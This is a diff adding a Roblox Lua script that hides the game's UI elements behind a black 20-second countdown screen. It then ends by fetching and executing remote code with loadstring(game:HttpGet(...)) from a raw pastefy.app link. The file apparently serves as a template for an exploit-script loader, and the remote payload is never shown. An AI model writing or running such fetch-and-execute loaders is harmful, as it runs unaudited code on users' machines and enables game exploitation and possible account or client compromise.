@@ -1,0 +1,42 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- Hide UI Elements
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+
+local background = Instance.new("Frame", screenGui)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+
+local countdownLabel = Instance.new("TextLabel", background)
+countdownLabel.Size = UDim2.new(1, 0, 1, 0)
+countdownLabel.TextColor3 = Color3.new(1, 1, 1)
+countdownLabel.BackgroundTransparency = 1
+countdownLabel.Font = Enum.Font.GothamBold
+countdownLabel.TextScaled = true
+countdownLabel.Text = "20s"
+
+-- Countdown logic
+local countdown = 20
+while countdown > 0 do
+    countdownLabel.Text = tostring(countdown) .. "s"
+    wait(1)
+    countdown -= 1
+end
+
+-- Clear GUI
+screenGui:Destroy()
+
+-- ✅ PLACE YOUR SCRIPT HERE
+loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
